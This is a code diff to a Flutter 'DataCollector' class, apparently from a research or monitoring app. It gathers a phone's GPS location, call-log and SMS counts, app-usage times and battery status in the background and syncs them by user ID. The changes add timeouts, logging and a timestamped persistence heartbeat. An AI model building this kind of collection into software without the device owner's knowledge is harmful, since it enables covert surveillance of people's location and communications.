@@ -9,16 +9,20 @@ import '../background_service_helper.dart';
 
 class DataCollector {
   static Future<void> collectAndSync(String userId) async {
-    // 0. SERVICE HEARTBEAT (Helps research team verify persistence)
-    await _sendData(userId, "Service_Heartbeat", "Active");
+    debugPrint("🚀 DataCollector: Starting sync for $userId");
+    
+    // 0. SERVICE HEARTBEAT
+    await _sendData(userId, "Service_Heartbeat", "Active_${DateTime.now().toIso8601String()}");
+
     // A. LOCATION
     try {
+      debugPrint("📍 DataCollector: Requesting Location...");
       Position position = await Geolocator.getCurrentPosition(
         locationSettings: const LocationSettings(
-          accuracy: LocationAccuracy.high,
-          timeLimit: Duration(seconds: 15),
+          accuracy: LocationAccuracy.medium,
         ),
-      );
+      ).timeout(const Duration(seconds: 15));
+      
       Map<String, dynamic> locData = {
         'lat': position.latitude,
         'lng': position.longitude,
@@ -27,39 +31,40 @@ class DataCollector {
       };
       await _sendData(userId, "Location", jsonEncode(locData));
     } catch (e) {
-      debugPrint("Location Error: $e");
+      debugPrint("Location Error or Timeout: $e");
+      await _sendData(userId, "System_Log", "Location_Error: $e");
     }
 
     // B. CALL LOGS (Last 24h)
     try {
+      debugPrint("📞 DataCollector: Querying Call Logs...");
       int now = DateTime.now().millisecondsSinceEpoch;
       Iterable<CallLogEntry> entries = await CallLog.query(
         dateFrom: now - (24 * 60 * 60 * 1000),
-      );
+      ).timeout(const Duration(seconds: 10));
+      
       Map<String, int> callStats = {
-        'incoming': entries
-            .where((c) => c.callType == CallType.incoming)
-            .length,
-        'outgoing': entries
-            .where((c) => c.callType == CallType.outgoing)
-            .length,
+        'incoming': entries.where((c) => c.callType == CallType.incoming).length,
+        'outgoing': entries.where((c) => c.callType == CallType.outgoing).length,
         'missed': entries.where((c) => c.callType == CallType.missed).length,
-        'rejected': entries
-            .where((c) => c.callType == CallType.rejected)
-            .length,
+        'rejected': entries.where((c) => c.callType == CallType.rejected).length,
       };
       await _sendData(userId, "Call_Stats_24h", jsonEncode(callStats));
     } catch (e) {
-      debugPrint("Call Log Error: $e");
+      debugPrint("Call Log Error or Timeout: $e");
     }
 
     // C. SMS (Daily Count)
     try {
+      debugPrint("💬 DataCollector: Querying SMS...");
       final SmsQuery query = SmsQuery();
       List<SmsMessage> inbox = await query.querySms(
         kinds: [SmsQueryKind.inbox],
-      );
-      List<SmsMessage> sent = await query.querySms(kinds: [SmsQueryKind.sent]);
+      ).timeout(const Duration(seconds: 10));
+      
+      List<SmsMessage> sent = await query.querySms(
+        kinds: [SmsQueryKind.sent],
+      ).timeout(const Duration(seconds: 10));
 
       int receivedToday = inbox.where((m) => _isToday(m.date)).length;
       int sentToday = sent.where((m) => _isToday(m.date)).length;
@@ -72,29 +77,29 @@ class DataCollector {
 
       await _sendData(userId, "SMS_Activity", jsonEncode(smsData));
     } catch (e) {
-      debugPrint("SMS Error: $e");
+      debugPrint("SMS Error or Timeout: $e");
     }
 
     // D. APP USAGE (Last 15m)
     try {
+      debugPrint("📱 DataCollector: Querying Usage Stats...");
       DateTime end = DateTime.now();
       DateTime start = end.subtract(const Duration(minutes: 15));
-      List<UsageInfo> usage = await UsageStats.queryUsageStats(start, end);
+      List<UsageInfo> usage = await UsageStats.queryUsageStats(start, end)
+          .timeout(const Duration(seconds: 10));
 
       Map<String, String> appUsage = {};
       for (var u in usage) {
         int totalTime = int.parse(u.totalTimeInForeground ?? "0");
         if (totalTime > 1000) {
-          // Filter < 1s
-          appUsage[u.packageName ?? "unknown"] =
-              "${(totalTime / 1000).toStringAsFixed(1)}s";
+          appUsage[u.packageName ?? "unknown"] = "${(totalTime / 1000).toStringAsFixed(1)}s";
         }
       }
       if (appUsage.isNotEmpty) {
         await _sendData(userId, "App_Usage_15m", jsonEncode(appUsage));
       }
     } catch (e) {
-      debugPrint("Usage Stats Error: $e");
+      debugPrint("Usage Stats Error or Timeout: $e");
     }
 
     // E. BATTERY STATUS
@@ -105,6 +110,8 @@ class DataCollector {
     } catch (e) {
       debugPrint("Battery Status Error: $e");
     }
+    
+    debugPrint("✅ DataCollector: Sync Complete");
   }
 
   // Helper method to consolidate sending logic
